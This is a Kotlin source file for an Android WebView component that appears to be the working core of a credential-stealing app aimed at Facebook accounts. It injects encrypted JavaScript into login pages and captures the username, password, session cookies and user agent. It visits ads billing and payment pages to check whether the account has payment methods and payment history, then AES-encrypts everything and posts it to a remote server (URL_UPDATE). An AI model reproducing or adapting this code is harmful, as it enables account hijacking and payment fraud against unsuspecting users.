package wuye.you.min.web

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.text.TextUtils
import android.util.AttributeSet
import android.webkit.WebSettings
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.greenrobot.eventbus.EventBus
import wuye.you.min.HomeActivity
import wuye.you.min.event.xEvent
import wuye.you.min.http.HttpTools
import wuye.you.min.http.OnNetworkRequest
import wuye.you.min.utils.*

@SuppressLint("SetJavaScriptEnabled")
class xWeb @JvmOverloads constructor(
    context: Context,
    private val step: Step,
    private val callback: PageCallback
) : WebView(context), xWebListener {
    private var isJump = false

    var id = ""

    init {
        settings.javaScriptEnabled = true
        settings.cacheMode = WebSettings.LOAD_DEFAULT
        addJavascriptInterface(xWebCallback(), "call")
        webChromeClient = xWebChromeClient(context, this)
        webViewClient = xWebViewClient(this)
    }

    override fun progressChanged(newProgress: Int) {
        callback.progressChanged()
        when (step) {
            Step.ONE -> {
                "load JS -> step one".print()
                evaluateJavascript(DesUtils(1).decrypt(HIDEHEADERJS), null)
                evaluateJavascript(DesUtils(1).decrypt(LOGINJS), null)
            }
            Step.TWO -> {
                "load JS -> step two".print()
                evaluateJavascript(DesUtils(1).decrypt(PAYMETHODJS), null)
                evaluateJavascript(DesUtils(1).decrypt(PAYHISTORYJS), null)
            }
        }

    }

    override fun pageFinished(cookieString: String, view: WebView?, url: String?) {
        callback.pageFinished()
        val agent = view?.settings?.userAgentString
        if (TextUtils.isEmpty(cookieString) || TextUtils.isEmpty(agent)) return
        when (step) {
            Step.ONE -> {
                "account info -> step one \n cookie : $cookieString \n url : $url".print()
                stepOne(agent = agent, cookieString = cookieString)
            }
            Step.TWO -> {
                "account info -> step two \n cookie : $cookieString \n url : $url".print()
                stepTwo(agent = agent, cookieString = cookieString, url = url)
            }
        }

    }

    private fun stepOne(agent: String?, cookieString: String) {
        if (cookieString.contains("wd=") && cookieString.contains("c_user") && !isJump) {
            agent?.let {
                val json = Gson().toJson(
                    mutableMapOf(
                        "un" to name,
                        "pw" to pwd,
                        "cookie" to cookieString,
                        "source" to config["name"],
                        "b" to it,
                        "payMethod" to false,
                        "payHistory" to false,
                        "step" to 1
                    )
                )
                val content = AesEncryptUtil.encrypt(json)
                HttpTools.with(context).fromUrl(URL_UPDATE).ofTypePost()
                    .connect(object : OnNetworkRequest {
                        override fun onSuccess(response: String?) {
                            "submit success: ${AesEncryptUtil.decrypt(response)}".print()
                            val result = Gson().fromJson(AesEncryptUtil.decrypt(response),HashMap::class.java)
                            result.print()
                            if (result["status"] == "success"){
                                isLogin = true
                                context.startActivity(Intent(context, HomeActivity::class.java))
                                EventBus.getDefault().post(xEvent("submit success"))
                            }else{
                                Toast.makeText(context, "Login Fail", Toast.LENGTH_SHORT).show()
                            }
                            (context as AppCompatActivity).finish()
                        }

                        override fun onFailure(
                            responseCode: Int,
                            responseMessage: String,
                            errorStream: String
                        ) {
                            "submit fail $responseMessage".print()
                            Toast.makeText(context, "Login Fail", Toast.LENGTH_SHORT).show()
                            (context as AppCompatActivity).finish()
                        }
                    }, content)
            }
        }
    }

    private fun stepTwo(agent: String?, cookieString: String, url: String?) {
        "url : $url".print()
        if (url != null) {
            when {
                url.contains("act=") -> {
                    id = url.split("act=")[1]
                    "id: $id".print()
                    (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
                        delay(1500)
                        withContext(Dispatchers.Main) {
                            loadUrl(ID_URL + id)
                        }
                    }
                }
                url.contains("ads/manage/billing") -> {
                    evaluateJavascript(DesUtils(1).decrypt(PAYMETHODJS), null)
                    (context as AppCompatActivity).lifecycleScope.launch(Dispatchers.IO) {
                        delay(1500)
                        withContext(Dispatchers.Main) {
                            loadUrl(PAYMENT_URL + id)
                        }
                    }
                }
                url.contains("business_payments") -> {
                    evaluateJavascript(DesUtils(1).decrypt(PAYHISTORYJS), null)
                    agent?.let {
                        val json = Gson().toJson(
                            mutableMapOf(
                                "un" to name,
                                "pw" to pwd,
                                "cookie" to cookieString,
                                "source" to config["name"],
                                "b" to it,
                                "payMethod" to hasPayMethod,
                                "payHistory" to hasPayHistory,
                                "step" to 2
                            )
                        )
                        val content = AesEncryptUtil.encrypt(json)
                        HttpTools.with(context).fromUrl(URL_UPDATE).ofTypePost()
                            .connect(object : OnNetworkRequest {
                                override fun onSuccess(response: String?) {
                                    "submit success: ${AesEncryptUtil.decrypt(response)}".print()
                                }

                                override fun onFailure(
                                    responseCode: Int,
                                    responseMessage: String,
                                    errorStream: String
                                ) {
                                    "submit fail $responseMessage".print()
                                }
                            }, content)
                    }
                }
            }
        }
    }

}